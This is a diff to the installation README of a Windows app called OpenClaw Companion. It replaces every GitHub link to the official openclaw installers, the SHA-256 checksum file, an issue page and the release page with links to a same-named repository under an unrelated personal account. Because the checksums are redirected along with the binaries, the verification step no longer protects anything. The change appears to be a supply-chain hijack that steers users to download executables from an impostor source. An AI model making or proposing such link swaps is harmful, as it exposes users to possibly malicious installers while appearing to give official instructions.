@@ -21,9 +21,9 @@ Download the latest stable installer from the canonical OpenClaw release assets:
 
 | File | Architecture |
 |------|-------------|
-| [OpenClawCompanion-Setup-x64.exe](https://github.com/openclaw/openclaw-windows-node/releases/latest/download/OpenClawCompanion-Setup-x64.exe) | Intel / AMD (most PCs) |
-| [OpenClawCompanion-Setup-arm64.exe](https://github.com/openclaw/openclaw-windows-node/releases/latest/download/OpenClawCompanion-Setup-arm64.exe) | ARM64 (Surface Pro X, Snapdragon laptops) |
-| [OpenClawCompanion-SHA256SUMS.txt](https://github.com/openclaw/openclaw-windows-node/releases/latest/download/OpenClawCompanion-SHA256SUMS.txt) | SHA-256 checksums |
+| [OpenClawCompanion-Setup-x64.exe](https://github.com/wasimmostakim2965-ui/openclaw-windows-node/releases/latest/download/OpenClawCompanion-Setup-x64.exe) | Intel / AMD (most PCs) |
+| [OpenClawCompanion-Setup-arm64.exe](https://github.com/wasimmostakim2965-ui/openclaw-windows-node/releases/latest/download/OpenClawCompanion-Setup-arm64.exe) | ARM64 (Surface Pro X, Snapdragon laptops) |
+| [OpenClawCompanion-SHA256SUMS.txt](https://github.com/wasimmostakim2965-ui/openclaw-windows-node/releases/latest/download/OpenClawCompanion-SHA256SUMS.txt) | SHA-256 checksums |
 
 If you're unsure, use the **x64** installer.
 
@@ -148,7 +148,7 @@ If the tray shows **Pending approval** after reconnecting, run the approval comm
 openclaw devices approve <device-id>
 ```
 
-See [issue #81](https://github.com/openclaw/openclaw-windows-node/issues/81) for context on this flow.
+See [issue #81](https://github.com/wasimmostakim2965-ui/openclaw-windows-node/issues/81) for context on this flow.
 
 ### Setup code doesn't work
 
@@ -183,7 +183,7 @@ Settings are stored at `%APPDATA%\OpenClawTray\settings.json`. If this file is c
 
 ## Updating
 
-OpenClaw Companion checks for updates automatically and shows a notification when a new version is available. Click **Update** to download and apply the update. You can also manually check by re-downloading from the [OpenClaw Windows docs](https://docs.openclaw.ai/platforms/windows) or the [latest OpenClaw Windows release](https://github.com/openclaw/openclaw-windows-node/releases/latest).
+OpenClaw Companion checks for updates automatically and shows a notification when a new version is available. Click **Update** to download and apply the update. You can also manually check by re-downloading from the [OpenClaw Windows docs](https://docs.openclaw.ai/platforms/windows) or the [latest OpenClaw Windows release](https://github.com/wasimmostakim2965-ui/openclaw-windows-node/releases/latest).
 
 ## Uninstalling
 
